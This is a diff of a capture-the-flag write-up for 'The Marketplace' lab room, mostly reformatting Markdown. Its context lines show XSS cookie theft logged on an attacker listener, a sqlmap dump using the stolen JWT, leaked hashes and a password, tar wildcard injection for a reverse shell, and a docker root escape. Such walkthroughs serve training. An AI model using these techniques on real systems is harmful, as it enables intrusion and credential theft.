@@ -1,49 +1,49 @@
 ---
 sticker: emoji//1f6d2
 ---
-# ENUMERATION
----
 
+# THE MARKETPLACE
 
+## ENUMERATION
 
-## OPEN PORTS
----
+***
 
+### OPEN PORTS
+
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 22   | ssh     |
 | 80   | http    |
 
+## RECONNAISSANCE
 
-
-# RECONNAISSANCE
----
+***
 
 We can check this by going into the website:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331160802.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331160802.png)
 
 We got a `login`, `signup`, also, we can check items:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331160825.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331160825.png)
 
 Let's try creating a test account to check if we got any more functionalities:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331160919.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331160919.png)
 
 We got some new stuff: `New Listing` and `Messages`, if we check the first one, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331160953.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331160953.png)
 
 We can add queries, since the file uploads are disabled, there's no need to test for file inclusion, let's try uploading a new list with `XSS` to check if its possible on here:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331161102.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331161102.png)
 
 If we submit the query:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331161110.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331161110.png)
 
 There we go, we got XSS, we can fuzz to check if there's an admin resource anywhere in case we can get the admin cookie:
 
@@ -82,13 +82,13 @@ messages                [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 33
 
 Let's begin exploitation.
 
-# EXPLOITATION
----
+## EXPLOITATION
 
+***
 
 Once we send the listing, we can check we got XSS, but we can also check this interesting stuff:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331161239.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331161239.png)
 
 We can check that we can report listing to admins, meaning that an admin user could possibly be surveilling the website and receiving the request, maybe we can exploit the XSS to get the admin cookie:
 
@@ -113,14 +113,13 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.239.175 - - [31/Mar/2025 21:20:40] "GET /?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NDM0NTYwMzl9.XxMci203JEpwiMq88Skqx40-2HDRa7ao8znkRjRjj4Q HTTP/1.1" 200 -
 ```
 
-
 The last one is the admin cookie, we know this by decoding the `JWT Token`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331162253.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331162253.png)
 
 Let's use the cookie and visualize the admin page:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331162423.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331162423.png)
 
 We got our first flag:
 
@@ -130,12 +129,11 @@ THM{c37a63895910e478f28669b048c348d5}
 
 We notice that we can list users, if we go to any user, we can see this:
 
- 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331163239.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331163239.png)
 
 The url seems odd, we can test stuff like `LFI` or `SQLI` payload:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331163332.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331163332.png)
 
 We got it, this page may be vulnerable to SQLI, let's use sqlmap:
 
@@ -143,13 +141,11 @@ We got it, this page may be vulnerable to SQLI, let's use sqlmap:
 sqlmap -u "http://10.10.239.175/admin?user=2" --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NDM0NTYwMzl9.XxMci203JEpwiMq88Skqx40-2HDRa7ao8znkRjRjj4Q' --technique=U --delay=2 -dump
 ```
 
-
 We get the following:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331164347.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331164347.png)
 
 I tried cracking these hashes but no luck, we can also find this other table:
-
 
 ```
 $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
@@ -157,8 +153,7 @@ $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
 $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331164802.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331164802.png)
 
 If we read the first one, it displays the following message:
 
@@ -172,14 +167,13 @@ It comes from user 1 which is system to user 3, which based on the user listing 
 jake:@b_ENXkGYUCAv3zJ
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331165002.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331165002.png)
 
 There we go, we can now begin privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
-
+***
 
 We can read the user flag now:
 
@@ -208,7 +202,7 @@ echo "Backing up files...";
 tar cf /opt/backups/backup.tar *
 ```
 
-- **Vulnerability**: The `*` wildcard in `tar cf /opt/backups/backup.tar *` is dangerous. If we control the files in the directory where the script runs, we can inject malicious filenames to execute code.
+* **Vulnerability**: The `*` wildcard in `tar cf /opt/backups/backup.tar *` is dangerous. If we control the files in the directory where the script runs, we can inject malicious filenames to execute code.
 
 Let's do the following:
 
@@ -237,7 +231,7 @@ sudo -u michael /opt/backups/backup.sh
 
 If we reproduce these steps, we can notice this in our listener:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331170833.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331170833.png)
 
 We can stabilize our shell first:
 
@@ -251,23 +245,21 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331170920.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331170920.png)
 
-The `docker` group membership (GID 999) grants **root-equivalent privileges** on the host system. We can exploit this to escalate into root, let's search gtfobins:
+The `docker` group membership (GID 999) grants **root-equivalent privileges** on the host system. We can exploit this to escalate into root, let's search gtfobins:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331172216.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331172216.png)
 
 So, based on that, we can do the following:
-
 
 ```
 docker run -v /:/host -it alpine chroot /host /bin/sh
 ```
 
-
 We can check this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331172248.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331172248.png)
 
 There we go, we can finally read root flag:
 
@@ -276,6 +268,4 @@ root@6e6c3ee6eed0:/# cat root/root.txt
 THM{d4f76179c80c0dcf46e0f8e43c9abd62}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331172348.png)
-
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331172348.png)
